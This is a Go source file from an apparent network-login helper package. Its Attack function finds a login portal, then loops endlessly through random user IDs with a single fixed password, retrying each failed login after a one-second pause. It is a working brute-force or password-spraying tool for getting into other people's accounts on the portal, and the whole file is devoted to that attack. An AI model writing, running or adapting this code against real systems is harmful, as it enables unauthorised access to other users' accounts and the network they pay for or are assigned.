package auth

import (
	"fmt"
	"time"

	"nmnm.cc/easy-net/internal/log"
)

type AttackConfig struct {
	Host     string
	Base     string
	Link     string
	Password string
	Timeout  time.Duration
	// TargetSpeed string
}

var attackLogger = log.New("auth/attack")

func Attack(cfg *AttackConfig) error {
	if cfg.Base == "" {
		base, err := FindPortal(cfg.Host, cfg.Link)
		if err != nil {
			return fmt.Errorf("failed to find portal: %w", err)
		}
		cfg.Base = base
	}

	for {
		tried := make(map[string]struct{})

		var userid string
		for {
			userid = RandomUserid()

			if _, ok := tried[userid]; ok {
				continue
			} else {
				tried[userid] = struct{}{}
			}

			if err := Login(&LoginConfig{
				Base:     cfg.Base,
				Link:     cfg.Link,
				UserID:   userid,
				Password: cfg.Password,
			}); err != nil {
				attackLogger.Warn("failed to login", "error", err)
				time.Sleep(1 * time.Second)
				continue
			}

			break
		}
	}
}
